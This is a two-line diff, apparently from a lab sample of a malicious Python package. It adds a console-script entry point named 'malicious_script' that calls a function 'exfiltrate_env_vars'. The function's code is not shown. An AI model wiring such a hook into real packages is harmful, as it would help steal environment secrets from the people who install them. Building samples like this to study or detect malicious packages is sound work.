@@ -1,0 +1,2 @@
+[console_scripts]
+malicious_script = artifact_lab_3_package_2b6a4744.malicious:exfiltrate_env_vars
